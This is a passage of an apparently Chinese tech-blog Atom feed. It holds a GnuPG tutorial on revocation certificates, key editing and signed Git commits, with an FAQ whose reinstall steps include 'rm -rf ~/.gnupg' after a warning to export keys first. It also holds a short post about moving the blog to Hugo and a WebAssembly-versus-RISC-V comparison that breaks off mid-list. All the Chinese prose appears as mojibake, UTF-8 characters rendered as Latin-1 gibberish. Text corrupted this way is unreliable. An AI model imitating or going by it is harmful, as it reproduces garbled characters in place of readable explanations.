</code></pre></div><p>ä¸Šè¿°å‘½ä»¤ç”¨äºå¯¼å…¥å¯†é’¥ï¼Œä¸åŒºåˆ†å…¬é’¥ç§é’¥</p>
<h3 id="æŸ¥çœ‹æ‰€æœ‰å¯†é’¥">æŸ¥çœ‹æ‰€æœ‰å¯†é’¥</h3>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg -k
</code></pre></div><h3 id="ç”ŸæˆåŠé”€è¯ä¹¦">ç”ŸæˆåŠé”€è¯ä¹¦</h3>
<p>å½“ä½ çš„ç§é’¥æ³„éœ²æˆ–è€…æ›´æ¢æ—¶ï¼Œéœ€è¦åŠé”€å¤±æ•ˆçš„å¯†é’¥ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨åŠé”€è¯ä¹¦</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --gen-revoke naive
</code></pre></div><p>æ¥ç€é€‰æ‹©åŠé”€åŸå› ï¼Œå°±èƒ½ç”ŸæˆåŠé”€è¯ä¹¦</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">sec  rsa2048/4C26D2E451FFDAF1 2020-04-02 naive (too young too simple) &lt;naive@test.com&gt;

è¦ä¸ºè¿™ä¸ªå¯†é’¥åˆ›å»ºä¸€ä¸ªåŠé”€è¯ä¹¦å—ï¼Ÿ(y/N) y
è¯·é€‰æ‹©åŠé”€çš„åŸå› ï¼š
  0 = æœªæŒ‡å®šåŸå› 
  1 = å¯†é’¥å·²æ³„æ¼
  2 = å¯†é’¥è¢«æ›¿æ¢
  3 = å¯†é’¥ä¸å†ä½¿ç”¨
  Q = å–æ¶ˆ
ï¼ˆä¹Ÿè®¸æ‚¨ä¼šæƒ³è¦åœ¨è¿™é‡Œé€‰æ‹© 1ï¼‰
æ‚¨çš„å†³å®šæ˜¯ä»€ä¹ˆï¼Ÿ 1
è¯·è¾“å…¥æè¿°ï¼ˆå¯é€‰ï¼‰ï¼›ä»¥ç©ºç™½è¡Œç»“æŸï¼š
&gt;
åŠé”€åŸå› ï¼šå¯†é’¥å·²æ³„æ¼
ï¼ˆæœªç»™å®šæè¿°ï¼‰
è¿™æ ·å¯ä»¥å—ï¼Ÿ (y/N) y
å·²å¼ºè¡Œä½¿ç”¨ ASCII å­—ç¬¦å°è£…è¿‡çš„è¾“å‡ºã€‚
-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: This is a revocation certificate

****
-----END PGP PUBLIC KEY BLOCK-----
å·²åˆ›å»ºåŠé”€è¯ä¹¦ã€‚

è¯·æŠŠè¿™ä¸ªæ–‡ä»¶è½¬ç§»åˆ°ä¸€ä¸ªæ‚¨å¯ä»¥è—èµ·æ¥çš„ä»‹è´¨ä¸Šï¼›å¦‚æœåäººè·å–åˆ°äº†è¿™
ä»½è¯ä¹¦çš„è¯ï¼Œé‚£ä¹ˆä»–å°±èƒ½ä½¿ç”¨å®ƒå¹¶è®©æ‚¨çš„å¯†é’¥æ— æ³•ç»§ç»­ä½¿ç”¨ã€‚æŠŠæ­¤è¯ä¹¦
æ‰“å°å‡ºæ¥å†å­˜æ”¾åˆ°å®‰å…¨çš„åœ°æ–¹ä¹Ÿæ˜¯å¾ˆå¥½çš„æ–¹æ³•ï¼Œä»¥å…æ‚¨çš„ä¿å­˜åª’ä½“å˜å¾—
ä¸å¯è¯»ã€‚ä½†æ˜¯åƒä¸‡å°å¿ƒï¼šæ‚¨æœºå™¨ä¸Šçš„æ‰“å°ç³»ç»Ÿå¯èƒ½ä¼šåœ¨æ‰“å°è¿‡ç¨‹ä¸­å‚¨å­˜
è¿™äº›æ•°æ®ï¼Œå¹¶ä½¿å¾—å…¶ä»–äººçœ‹åˆ°ï¼
</code></pre></div><p>åªéœ€è¦ä¿å­˜ä¸­é—´çš„åŠé”€è¯ä¹¦ï¼Œå½“å¯†é’¥æ³„éœ²æ—¶å°†å…¶å‘é€åˆ°å…¬é’¥æœåŠ¡å™¨ï¼Œå°±å¯ä»¥åŠé”€æ—§å¯†é’¥</p>
<h3 id="ç¼–è¾‘å¯†é’¥">ç¼–è¾‘å¯†é’¥</h3>
<p>æœ‰æ—¶å€™éœ€è¦å¯¹å¯†é’¥è¿›è¡Œç¼–è¾‘ï¼Œå¦‚ä¿®æ”¹ä¿¡ä»»åº¦ï¼Œç”Ÿæˆå­å¯†é’¥ç­‰ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --edit-key naive
</code></pre></div><p>æ¥ç€å°±ä¼šè¿›å…¥äº¤äº’æ¨¡å¼ç­‰å¾…å‘½ä»¤ï¼Œè¾“å…¥<code>help</code>å¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ“ä½œ</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">gpg (GnuPG/MacGPG2) 2.2.17; Copyright (C) 2019 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

ç§é’¥å¯ç”¨ã€‚

sec  rsa2048/4C26D2E451FFDAF1
     åˆ›å»ºäºï¼š2020-04-02  æœ‰æ•ˆè‡³ï¼šæ°¸ä¸       å¯ç”¨äºï¼šSC
     ä¿¡ä»»åº¦ï¼šç»å¯¹        æœ‰æ•ˆæ€§ï¼šç»å¯¹
ssb  rsa2048/A86AB46BDC677F8F
     åˆ›å»ºäºï¼š2020-04-02  æœ‰æ•ˆè‡³ï¼šæ°¸ä¸       å¯ç”¨äºï¼šE
[ ç»å¯¹ ] (1). naive (too young too simple) &lt;naive@test.com&gt;

gpg&gt;
</code></pre></div><h2 id="ä½¿ç”¨-gpg-ç­¾å-git-commit">ä½¿ç”¨ GPG ç­¾å Git Commit</h2>
<p>è¿™å°±æ˜¯æˆ‘ä½¿ç”¨ GPG çš„åŸå› ï¼Œä¸‹é¢å¼€å§‹é…ç½®ï¼Œé¦–å…ˆé…ç½® git</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># è®¾ç½®å…¨å±€é»˜è®¤å¯†é’¥</span>
git config --global user.signingkey &lt;å¯†é’¥ID&gt;

<span class="c1"># è®¾ç½®å¼ºåˆ¶ä½¿ç”¨GPGç­¾å</span>
git config --global commit.gpgsign <span class="nb">true</span>
</code></pre></div><p>ä¹‹ååœ¨æäº¤æ—¶ï¼Œåªéœ€è¦å¸¦ä¸Š<code>-S</code>å‚æ•°ï¼Œå°±èƒ½å¯¹æäº¤è¿›è¡Œç­¾å</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git commit -S -m <span class="s2">&#34;xxx&#34;</span>
</code></pre></div><p>æŸ¥çœ‹ git æ—¥å¿—æ—¶ï¼Œå¸¦ä¸Š<code>--show-signature</code>å‚æ•°å°±èƒ½çœ‹åˆ°ç­¾åä¿¡æ¯</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git log --show-signature
</code></pre></div><p>æœ€åä¸€æ­¥ï¼Œéœ€è¦æŠŠä½ çš„å…¬é’¥æäº¤åˆ° githubï¼Œå¦åˆ™å®ƒæ€ä¹ˆçŸ¥é“è¿™ä¸ªç­¾åæ˜¯ä½ çš„å‘¢ï¼Ÿå°†ä¹‹å‰ç”Ÿæˆçš„æ–‡æœ¬ç±»å‹çš„å…¬é’¥<code>public_key.txt</code>æäº¤åˆ° <a href="https://github.com/settings/keys">github</a>ï¼Œä¹‹åä½ çš„æäº¤åœ¨ github ä¸Šå°±æœ‰åƒå¼€å¤´é‚£æ ·çš„ç»¿è‰²å°å‹¾äº†</p>
<h2 id="faq">FAQ</h2>
<h3 id="è§£å†³gitæäº¤æ—¶å‡ºç°error-gpg-failed-to-sign-the-data">è§£å†³gitæäº¤æ—¶å‡ºç°<code>error: gpg failed to sign the data</code></h3>
<p>ä»¥ä¸‹æ˜¯åŸå§‹è§£å†³æ–¹æ¡ˆï¼Œè™½ç„¶èƒ½è§£å†³é—®é¢˜ï¼Œä½†ä½“éªŒä¸å¥½ï¼Œåœ¨ IDE ä¸­æäº¤æ—¶éš¾ä»¥è¾“å…¥å¯†ç ï¼Œå»ºè®® MacOS ç”¨æˆ·é‡‡ç”¨ä¸Šé¢è¯´çš„ <code>GPG Suite</code>è¿›è¡Œæ“ä½œï¼Œå®ƒå¯ä»¥æ¥ç®¡å¯†ç è¾“å…¥æ“ä½œï¼Œå¼¹å‡ºä¸€ä¸ªç‹¬ç«‹çª—å£ç”¨äºè¾“å…¥ï¼Œè¿˜èƒ½å°†å¯†ç æ·»åŠ åˆ° iCloud é’¥åŒ™ä¸²ä¸­ï¼Œé¿å…é‡å¤è¾“å…¥å¯†ç ã€‚å¦‚æœä½ å·²ç»åœ¨ä½¿ç”¨<code>GPG Suite</code>ï¼Œä½†ä»ç„¶é‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å°è¯•é‡è£…<code>GPG Suite</code></p>
<ol>
<li>
<p>å¯¼å‡ºå¯†é’¥ï¼ˆç§é’¥ï¼‰<strong>é‡è¦</strong></p>
</li>
<li>
<p>å¸è½½ GPG</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew uninstall gnupg gnutls
   
brew cask uninstall gpg-suite
</code></pre></div></li>
<li>
<p>åˆ é™¤ gpg æ–‡ä»¶å¤¹ï¼Œ<strong>è¯·ç¡®è®¤å·²ç»å¯¼å‡ºå¯†é’¥</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">rm -rf ~/.gnupg
</code></pre></div></li>
<li>
<p>é‡æ–°å®‰è£…<code>GPG Suite</code>ï¼Œ<strong>ä¸éœ€è¦æ‰‹åŠ¨å®‰è£… GPG</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div></li>
<li>
<p>å¯¼å…¥å¯†é’¥</p>
</li>
</ol>
<p>è¿™æ—¶ <code>GPG Suite</code>åº”è¯¥å·²ç»å¯ä»¥æ­£å¸¸å·¥ä½œäº†</p>
<hr>
<p><em>åŸå§‹æ–¹æ¡ˆ</em></p>
<p>é¦–å…ˆæµ‹è¯•<code>gpg</code>å·¥ä½œæ˜¯å¦æ­£å¸¸</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> <span class="p">|</span> gpg --clearsign
</code></pre></div><p>å¦‚æœå‡ºç°ä¸‹é¢çš„é”™è¯¯</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
gpg: ç­¾åæ—¶å¤±è´¥ï¼š Inappropriate ioctl for device
gpg: [stdin]: clear-sign failed: Inappropriate ioctl for device
</code></pre></div><p>è¯´æ˜<code>gpg</code>æ— æ³•æ‰“å¼€è¾“å…¥å¯†ç çš„çª—å£ã€‚åœ¨ç”Ÿæˆ<code>gpg key</code>æ—¶ï¼Œå¦‚æœæŒ‡å®šäº†å¯†ç ï¼Œåœ¨ç­¾åæ—¶å°±éœ€è¦è¾“å…¥ã€‚è€Œè¿™æ—¶<code>gpg</code>ä¸çŸ¥é“ä»å“ªé‡Œè¯»å–è¾“å…¥ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä»¥ä¸‹çš„å‘½ä»¤æŒ‡å®š<code>tty</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">export</span> <span class="nv">GPG_TTY</span><span class="o">=</span><span class="k">$(</span>tty<span class="k">)</span> 
</code></pre></div><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸å¼¹å‡ºè¾“å…¥å¯†ç çš„çª—å£ã€‚</p>
<hr>
<p>ä½†æˆ‘ä¸å–œæ¬¢è¿™ä¸ªå…¨å±çª—å£ï¼Œä¸»è¦æ˜¯åœ¨macä¸Š<code>gpg</code>è¯­è¨€ä¸ºä¸­æ–‡æ—¶ï¼Œè¿™ä¸ªçª—å£ä¼šä¹±ç ï¼Œæ‰€ä»¥ç”¨å¦ä¸€ä¸ªæ–¹æ³•è§£å†³ã€‚ç¼–è¾‘<code>~/.gnupg/gpg.conf</code>ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">use-agent 
pinentry-mode loopback
</code></pre></div><p>å†ç¼–è¾‘<code>~/.gnupg/gpg-agent.conf</code>ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">allow-loopback-pinentry
</code></pre></div><p>æœ€åè¾“å…¥<code>echo RELOADAGENT | gpg-connect-agent</code>é‡å¯<code>agent</code>å°±ç”Ÿæ•ˆäº†ï¼Œè¿™æ ·å¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥å¯†ç </p>
<blockquote>
<p><a href="https://d.sb/2016/11/gpg-inappropriate-ioctl-for-device-errors">source</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/renew/</id>
        <title><![CDATA[é‡æ–°å¼€å§‹]]></title>
        <updated>2020-03-19T13:28:13+08:00</updated>
        <link href="https://blog.creedowl.com/posts/renew/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/renew/"><![CDATA[<p>çªç„¶å‘ç°è·ä¸Šä¸€ç¯‡blogå‘å¸ƒå·²ç»è¿‡å»äº†å¿«ä¸€å¹´çš„æ—¶é—´ï¼ŒåŸå…ˆçš„blogä¹Ÿç–äºæ‰“ç†ï¼Œåªæœ‰å¯¥å¯¥å‡ ç¯‡æ–‡ç« ï¼Œå›¾åºŠåŸºæœ¬å¤±æ•ˆã€‚ä¸»è¦å› ä¸ºæˆ‘æ¯”è¾ƒæ‡’ï¼Œè®¤çœŸæ•´ç†ä¸€ç¯‡blogä¹Ÿæ˜¯è´¹æ—¶è´¹åŠ›çš„äº‹æƒ…ã€‚ä½†è‡ªå·±æ•´ç†ä¸€äº›æ–‡ç« æ˜¯å¾ˆæœ‰æ„ä¹‰çš„äº‹æƒ…ï¼Œèƒ½è®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ å†ç¨‹ï¼Œæ€»ç»“çŸ¥è¯†ï¼Œå†æ¬¡é‡åˆ°ç›¸åŒçš„é—®é¢˜ä¹Ÿå¯ä»¥å›å¤´å‚è€ƒã€‚</p>
<p>blogä¸€ç›´æ²¡æ›´æ–°æœ‰ä¸ªè¯±å› æ˜¯å¾®åšå›¾åºŠå¼€å¯äº†é˜²ç›—é“¾ï¼Œå¯¼è‡´blogä¸­è®¸å¤šå›¾ç‰‡éƒ½æ— æ³•è®¿é—®äº†<del>è€ç‹èƒŒé”…</del>ï¼Œåˆæ‡’å¾—ä¿®å¤ã€‚åŒæ—¶çœ‹ä¸Šäº†<a href="https://gohugo.io/">hugo</a>è¿™ä¸ªæ¡†æ¶ï¼Œæ­£å¥½ä¹Ÿåœ¨å­¦ä¹ <code>golang</code>ï¼Œå°±æƒ³ä»<code>hexo</code>æ›´æ¢åˆ°<code>hugo</code>ã€‚ä½†è¿™ä¸¤ä¸ªæ¡†æ¶æœ‰ä¸ªå¾ˆå¤§çš„åŒºåˆ«<del>æˆ‘è§‰å¾—</del>ï¼Œå°±æ˜¯<code>hexo</code>æ˜¯ä¸€å †å‰ç«¯å·¥ç¨‹å¸ˆæçš„ï¼Œè€Œ<code>hugo</code>æ˜¯ä¸€å †åç«¯å·¥ç¨‹å¸ˆæçš„ï¼Œè¿™å°±å¯¼è‡´äº†<code>hugo</code>æ²¡æœ‰å•¥å¥½çœ‹çš„ä¸»é¢˜ï¼Œä¹Ÿå°±ä¸€ç›´é¸½ä¸‹å»äº†ã€‚</p>
<p>å»å¹´å¹´ä¸­çš„æ—¶å€™å°±æ‰“ç®—å’Œ@queensferryå†™ä¸€ä¸ªHugoä¸»é¢˜<a href="https://github.com/queensferryme/hugo-theme-verse">verse</a>ï¼Œç«‹é¡¹çš„æ—¶å€™å¾ˆå¤šæƒ³æ³•ï¼Œä½†åšèµ·æ¥å°±ä¸æƒ³åŠ¨äº†ã€‚æ‘¸å®Œé¡µé¢æ¡†æ¶åå°±é¸½äº†ï¼Œä¸€æ–¹é¢å®åœ¨ä¸ä¼šè®¾è®¡ï¼Œå¦ä¸€æ–¹é¢è°ƒå„ç§æ ·å¼æ˜¯çœŸçš„è›‹ç–¼ã€‚é¸½äº†åŠå¹´åˆæ¡èµ·æ¥<del>è™½ç„¶æˆ‘æ²¡å†™å•¥</del>ï¼Œä¸è¿‡æ¸æ¸ä¹Ÿæœ‰ç‚¹æ ·å­äº†ã€‚ä½†ä»Šå¤©å‘ç°äº†ä¸€ä¸ªå¾ˆæ£’çš„ä¸»é¢˜<a href="https://github.com/Track3/hermit">hermit</a>ï¼Œå‡ ä¹å°±æ˜¯æˆ‘æƒ³è¦çš„ï¼Œé‡Œé¢å¾ˆå¤šè®¾è®¡å°±æ˜¯æˆ‘å½“åˆæ„æƒ³çš„å†…å®¹ï¼Œé©¬ä¸Šæ¡èµ·äº†blogã€‚</p>
<p>è¿™ä¸€å¹´æ¥ä¹Ÿè®¡åˆ’æ•´ç†ä¸ªäººç¬”è®°è½¯ä»¶ï¼Œåœ¨å°è¯•äº†æ•°ä¸ªè½¯ä»¶åï¼Œæœ‰å°è±¡ç¬”è®°ï¼Œä¸ºçŸ¥ç¬”è®°ï¼Œæœ‰é“äº‘ç¬”è®°ï¼ŒonenoteåŠä¸€å †å¼€æºç¬”è®°åº”ç”¨ï¼Œéƒ½ä¸å¤ªæ»¡è¶³æˆ‘çš„éœ€æ±‚ã€‚æœ€åå‘ç°äº†notionè¿™ä¸ªä¸œè¥¿è´¼é¦™ï¼ˆä¸»è¦å¯¹å­¦ç”Ÿå…è´¹äº†ï¼‰ï¼Œæœ€åå°±é€‰æ‹©äº†å®ƒã€‚ä¸è¿‡è¿™ä¹Ÿå¯¼è‡´æˆ‘æ‰‹ä¸Šä¸€å †ç¬”è®°åˆ†æ•£åœ¨å„å¤„ï¼Œæ‰“ç®—åé¢æ•´ç†æ¸…æ¥š<del>æ°´</del>å‡ ç¯‡blogå‡ºæ¥ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[WebAssembly ä¸ RISC-V æŒ‡ä»¤é›†æ¶æ„çš„å¯¹æ¯”]]></title>
        <updated>2020-03-15T09:51:51+08:00</updated>
        <link href="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://blog.invariant.cn/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">A Comparison between WebAssembly and RISC-V</div><div class="kg-bookmark-description">WebAssembly and RISC-V are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Letâ€™s do a comparison.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="WebAssembly ä¸ RISC-V æŒ‡ä»¤é›†æ¶æ„çš„å¯¹æ¯”"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="WebAssembly ä¸ RISC-V æŒ‡ä»¤é›†æ¶æ„çš„å¯¹æ¯”"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/wasm-riscv.png" alt="WebAssembly ä¸ RISC-V æŒ‡ä»¤é›†æ¶æ„çš„å¯¹æ¯”"><p>WebAssembly ä¸ RISC-V éƒ½æ˜¯è¿‘åå¹´å†…æ–°å‡ºç°çš„æŒ‡ä»¤é›†æ¶æ„ã€‚æ‘˜å½•ä¸€æ®µ <a href="https://webassembly.org/">WebAssembly å®˜æ–¹ç½‘ç«™</a>çš„ä»‹ç»ï¼š</p><blockquote>WebAssembly (abbreviated <em><em>Wasm</em></em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><blockquote>WebAssembly ï¼ˆç®€å†™ä¸º Wasmï¼‰æ˜¯ä¸€ç§æ ˆè™šæ‹Ÿæœºçš„äºŒè¿›åˆ¶æŒ‡ä»¤æ ¼å¼ã€‚Wasm è¢«è®¾è®¡ä¸º C/C++/Rust ç­‰é«˜çº§è¯­è¨€çš„å¯ç§»æ¤ç¼–è¯‘ç›®æ ‡ï¼Œä»è€Œå…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åº”ç”¨ç¨‹åºéƒ¨ç½²åœ¨ Web ä¸Šã€‚</blockquote><p>å’Œ <a href="https://riscv.org/">RISC-V çš„å®˜æ–¹ä»‹ç»</a>ï¼š</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><blockquote>RISC-V æ˜¯ä¸€ç§è‡ªç”±ã€å¼€æ”¾çš„æŒ‡ä»¤é›†æ¶æ„ï¼Œé€šè¿‡å¼€æ”¾æ ‡å‡†åä½œä½¿æ–°çš„å¤„ç†å™¨åˆ›æ–°æˆä¸ºå¯èƒ½ã€‚RISC-V æ¥è‡ªå­¦æœ¯ç ”ç©¶ï¼Œæä¾›äº†æ›´åŠ è‡ªç”±ã€å¯æ‰©å±•çš„è½¯ç¡¬ä»¶æ¶æ„ï¼Œä¸ºæœªæ¥ 50 å¹´çš„è®¡ç®—æŠ€æœ¯è®¾è®¡ä¸åˆ›æ–°é“ºå¹³é“è·¯ã€‚</blockquote><p>è¿™ä¸¤ç§æŒ‡ä»¤é›†æ¶æ„çœ‹èµ·æ¥å¾ˆä¸ä¸€æ ·ã€‚WebAssembly çš„ç›®æ ‡å¹³å°ä¸»è¦æ˜¯ JIT ç¼–è¯‘å™¨ï¼ˆä»¥åŠæµè§ˆå™¨ï¼‰ï¼›è€Œ RISC-V åˆ™ä¸“ä¸ºç¡¬ä»¶è®¾è®¡ï¼Œå…¶ç›®æ ‡ä¹‹ä¸€å³æ˜¯åœ¨ FPGA å’Œç”µè·¯ä¸Šçš„é«˜æ•ˆå®ç°ã€‚WebAssembly ä¸ RISC-V çš„å…³ç³»ä¼¼ä¹ç±»ä¼¼äºæ—©æœŸçš„ Java ä¸ x86ï¼šä¸€ç§å­—èŠ‚ç æ ¼å¼ï¼Œå’Œä¸€ä¸ªç¡¬ä»¶æŒ‡ä»¤é›†ã€‚å®ƒä»¬æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ</p><p>å…¶å®å­—èŠ‚ç æ ¼å¼ä¸ç¡¬ä»¶æŒ‡ä»¤é›†çš„åˆ†ç•Œçº¿å¹¶ä¸æ˜¯éå¸¸æ¸…æ™°ã€‚ä¾‹å¦‚åœ¨ x86 æŒ‡ä»¤é›†çš„æ—©æœŸå®ç°ä¸­ï¼ŒæŒ‡ä»¤ç»è¿‡ä¸€å±‚è§£ç ç›´æ¥è¢«åˆ†å‘åˆ°æ‰§è¡Œç”µè·¯å»æ‰§è¡Œã€‚ä½†è¿‘å¹´çš„ Intel/AMD CPU é‡‡ç”¨äº†ä¸åŒçš„æ‰§è¡Œç­–ç•¥ï¼šæ¯æ¡ x86 æŒ‡ä»¤é¦–å…ˆè¢«ç¿»è¯‘ä¸ºæŸç§å†…éƒ¨ RISC æŒ‡ä»¤ï¼Œæ‰§è¡Œç»„ä»¶æ”¶åˆ°çš„æŒ‡ä»¤å…¶å®å·²ç»æ˜¯ç¿»è¯‘åçš„ RISC ç¼–ç æ ¼å¼ã€‚è¿™å®é™…ä¸Šç›¸å½“äºä» x86 åˆ°å†…éƒ¨ RISC æŒ‡ä»¤é›†çš„æŸç§â€œç¡¬ä»¶å®æ—¶ç¼–è¯‘â€è¿‡ç¨‹ã€‚åŒæ—¶ï¼Œ<a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> ä¸ <a href="https://github.com/piranna/wasmachine">WebAssembly</a> ä¹Ÿæœ‰å®éªŒæ€§çš„ç¡¬ä»¶å®ç°ï¼Œè™½ç„¶å®ƒä»¬è¿˜ä¸èƒ½èµ¶ä¸Š JIT ç¼–è¯‘å™¨åœ¨ç°ä»£ CPU ä¸Šæ‰€èƒ½è¾¾åˆ°çš„æ•ˆç‡ã€‚</p><blockquote>æˆ‘ä»¬å·²ç»å¯ä»¥çœ‹åˆ° RISC-V æŒ‡ä»¤é›†<a href="https://github.com/nervosnetwork/ckb-vm">è¢«ç”¨äºåŒºå—é“¾çš„æ™ºèƒ½åˆçº¦</a>ï¼Œè€Œ WebAssembly æ­¤å‰å‡ ä¹æ˜¯åŸç”Ÿè¯­è¨€æ™ºèƒ½åˆçº¦çš„å”¯ä¸€é€‰æ‹©ã€‚</blockquote><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯¹ WebAssembly ä¸ RISC-V åšä¸€ä¸ªæ¯”è¾ƒã€‚</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">å¼€æº</font></strong></td>
<td>æ˜¯</td>
<td>æ˜¯</td>
</tr>
<tr>
<td><strong><font color="#512da8">å†…å­˜æ¶æ„</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">æµ®ç‚¹æ”¯æŒ</font></strong></td>
<td>æ˜¯</td>
<td>æ˜¯ (å®šä¹‰äºæ‰©å±•)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>æ˜¯</td>
<td>æ˜¯ (å®šä¹‰äºæ‰©å±•)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ä»£ç /æ•°æ®åˆ†ç¦»</font></strong></td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">æŒ‡é’ˆå®½åº¦</font></strong></td>
<td>32</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">æœ€å¤§æ•°æ®å®½åº¦</font></strong></td>
<td>64</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">é™æ€ç±»å‹</font></strong></td>
<td>å¼±</td>
<td>æ— </td>
</tr>
<tr>
<td><strong><font color="#bb4d00">æ§åˆ¶æµçº¦æŸ</font></strong></td>
<td>æ˜¯</td>
<td>å¦</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">æœºå™¨æ¨¡å‹</font></strong></td>
<td>æ ˆæœº</td>
<td>å¯„å­˜å™¨æœº</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">å†…å­˜å¸ƒå±€</font></strong></td>
<td>çº¿æ€§</td>
<td>åˆ†é¡µ</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">å†…å­˜ä¿æŠ¤</font></strong></td>
<td>æ— </td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">å¤šçº¿ç¨‹åŒæ­¥</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">æŒ‡ä»¤ç¼–ç </font></strong></td>
<td>å˜é•¿</td>
<td>å®šé•¿ (2 æˆ– 4 å­—èŠ‚)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ä¸ç¯å¢ƒäº¤äº’</font></strong></td>
<td>å¯¼å…¥å‡½æ•°</td>
<td>ç³»ç»Ÿè°ƒç”¨</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">å¯æ‰§è¡Œæ˜ åƒæ ¼å¼</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p><strong>1. ä»£ç /æ•°æ®åˆ†ç¦»</strong></p><p>åŒ…æ‹¬ RISC-V åœ¨å†…çš„å¤§å¤šæ•°ç°ä»£æ¶æ„å¯¹ä»£ç å’Œæ•°æ®ä½¿ç”¨åŒä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œä½†æ˜¯ WebAssembly æ²¡æœ‰è¿™æ ·åšã€‚å®é™…ä¸Šï¼Œè¿è¡Œä¸­çš„ä»£ç ç”šè‡³æ²¡æœ‰åŠæ³•è¯»/å†™å®ƒè‡ªå·±ã€‚è¿™ä¸ªè®¾è®¡çš„åŸå› å¯èƒ½æ˜¯ï¼š</p><ul><li>ç®€åŒ– JIT ç¼–è¯‘å™¨çš„å®ç°ã€‚å¦‚æœä»£ç å¯ä»¥è‡ªæˆ‘ä¿®æ”¹ï¼Œé‚£ä¹ˆ JIT ç¼–è¯‘å™¨åˆ™éœ€è¦æœ‰æ£€æµ‹ä¿®æ”¹å’Œé‡æ–°ç”Ÿæˆç›®æ ‡ä»£ç çš„èƒ½åŠ›ï¼Œè€Œè¿™éœ€è¦ç›¸å½“å¤æ‚çš„å®ç°æœºåˆ¶ã€‚</li><li>WebAssembly 